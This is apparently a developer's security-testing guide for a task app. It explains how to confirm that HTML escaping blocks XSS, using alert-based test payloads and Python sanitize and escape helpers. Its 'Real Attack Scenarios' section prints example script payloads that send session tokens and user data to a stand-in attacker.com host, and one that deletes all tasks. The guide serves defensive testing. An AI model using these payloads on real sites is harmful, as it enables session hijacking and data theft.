# XSS Attack Simulation - What Happens If Escaping Fails

## The Risk

If HTML escaping is **NOT working**, entering an XSS payload like `<script>alert('XSS')</script>` as a task name would:

1. **Be stored in the database** (with the script tags)
2. **Be displayed in the UI** without escaping
3. **Execute in the browser** when the page loads
4. **Show an alert popup** (in this example)
5. **Potentially allow attackers to:**
   - Steal session tokens from localStorage
   - Access user data via JavaScript
   - Perform actions as the logged-in user
   - Redirect to malicious sites
   - Inject malicious code into the page

## How to Test If Escaping Is Working

### Method 1: Browser DevTools Test

1. **Start your app:**
   ```bash
   python app.py
   ```

2. **Create a task with XSS payload:**
   - Go to `/create_task`
   - Task name: `<script>alert('XSS Test')</script>`
   - Description: `<img src=x onerror=alert('XSS Test')>`
   - Click "Create Task"

3. **Open Browser DevTools (F12)**

4. **Check Console tab:**
   - ✅ **If escaping works:** No alerts, no errors
   - ❌ **If escaping fails:** Alert popup appears!

5. **Check Elements tab:**
   - Inspect the task name in the dashboard
   - ✅ **If escaping works:** You'll see `&lt;script&gt;alert(&#x27;XSS Test&#x27;)&lt;/script&gt;`
   - ❌ **If escaping fails:** You'll see `<script>alert('XSS Test')</script>` (raw HTML)

6. **View Page Source (Ctrl+U):**
   - Search for your task name
   - ✅ **If escaping works:** HTML is escaped (`&lt;script&gt;`)
   - ❌ **If escaping fails:** Raw HTML tags are present

### Method 2: Automated Test

Run the test script:
```bash
python test_xss_in_app.py
```

This will:
- Test escaping in app context
- Show what happens without escaping
- Check if escaping is used in UI files

## What You Should See (If Escaping Works)

### In Browser Console:
```
(No output - no alerts, no errors)
```

### In Page Source:
```html
<div class="task-name">
  &lt;script&gt;alert(&#x27;XSS Test&#x27;)&lt;/script&gt;
</div>
```

### In DevTools Elements:
```html
<div class="task-name">
  &lt;script&gt;alert(&#x27;XSS Test&#x27;)&lt;/script&gt;
</div>
```

## What You Should NOT See (If Escaping Fails)

### ❌ Alert Popup:
```
[Alert Dialog]
XSS Test
[OK]
```

### ❌ In Page Source (Raw HTML):
```html
<div class="task-name">
  <script>alert('XSS Test')</script>
</div>
```

### ❌ In Browser Console:
```
(Alert executed)
```

## Real Attack Scenarios

If escaping fails, an attacker could:

### 1. Steal Session Tokens
```javascript
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('session_token'));
</script>
```

### 2. Access User Data
```javascript
<script>
  // Access user's tasks via API
  fetch('/api/tasks').then(r => r.json()).then(data => {
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
  });
</script>
```

### 3. Perform Actions as User
```javascript
<script>
  // Delete user's tasks
  fetch('/api/tasks/delete-all', {method: 'DELETE'});
</script>
```

## How Our Escaping Prevents This

### Input Sanitization (Before Storage)
```python
from backend.security_utils import sanitize_for_storage

# User enters: <script>alert('XSS')</script>
safe_input = sanitize_for_storage(user_input)
# Result: "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;"
# Stored in database as escaped text
```

### Output Escaping (Before Display)
```python
from backend.security_utils import escape_for_display

# Retrieve from database
task_name = task['name']  # "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;"

# Display in UI
ui.label(escape_for_display(task_name))
# Browser renders as text, not HTML
```

## Verification Checklist

Before deploying, verify:

- [ ] Enter XSS payload in task name → No alert appears
- [ ] Enter XSS payload in description → No alert appears
- [ ] View task in dashboard → HTML is escaped in page source
- [ ] Browser console shows no JavaScript execution
- [ ] DevTools Elements shows escaped HTML (`&lt;script&gt;`)
- [ ] Automated tests pass: `python test_security_features.py`
- [ ] App context test passes: `python test_xss_in_app.py`

## If Escaping Is NOT Working

**STOP IMMEDIATELY** - Do not deploy!

1. **Check where user data is displayed:**
   - Search for `ui.label(` or `ui.html(` in UI files
   - Ensure `escape_for_display()` is called

2. **Check where user data is stored:**
   - Search for manager methods that save user input
   - Ensure `sanitize_for_storage()` is called

3. **Review security_utils.py:**
   - Verify `sanitize_html()` function works
   - Test with: `python test_security_features.py`

4. **Fix the issue:**
   - Add `escape_for_display()` to all display locations
   - Add `sanitize_for_storage()` to all storage locations
   - Re-test thoroughly

5. **Only deploy after:**
   - All tests pass
   - Manual browser testing confirms no XSS
   - Code review confirms escaping is used everywhere

## Quick Test Command

```bash
# Test escaping functions
python test_security_features.py

# Test in app context
python test_xss_in_app.py

# Manual test in browser
# 1. Start app: python app.py
# 2. Create task with: <script>alert('XSS')</script>
# 3. Check browser - NO alert should appear
```

## Summary

**If escaping works:** XSS payloads are displayed as harmless text  
**If escaping fails:** XSS payloads execute as JavaScript - CRITICAL SECURITY VULNERABILITY

Always test in the actual running app to verify escaping is working!
